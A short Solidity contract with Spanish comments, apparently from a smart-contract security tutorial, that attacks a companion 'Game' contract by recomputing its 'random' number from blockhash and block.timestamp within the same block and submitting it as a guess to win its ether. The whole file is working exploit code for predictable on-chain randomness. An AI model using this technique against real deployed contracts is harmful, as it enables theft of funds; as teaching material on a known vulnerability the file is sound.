// SPDX-License-Identifier: MIT
  pragma solidity ^0.8.4;

  import "./Game.sol";

  contract Attack {
      Game game;
     /**
           Crea una instancia de contrato de Juego con la ayuda de `gameAddress`
       */
      constructor(address gameAddress) {
          game = Game(gameAddress);
      }

 /**
           ataca el contrato del `Juego` adivinando el número exacto porque `blockhash` y `block.timestamp`
           es accesible públicamente
       */
      function attack() public {
      // `abi.encodePacked` toma los dos parámetros - `blockhash` y `block.timestamp`
           // y devuelve un array de bytes que luego pasa a keccak256 que devuelve `bytes32`
           // que luego se convierte en `uint`.
           // keccak256 es una función hash que toma un array de bytes y la convierte en bytes32
          uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
          game.guess(_guess);
      }

     // Se llama cuando el contrato recibe ether
      receive() external payable{}
  }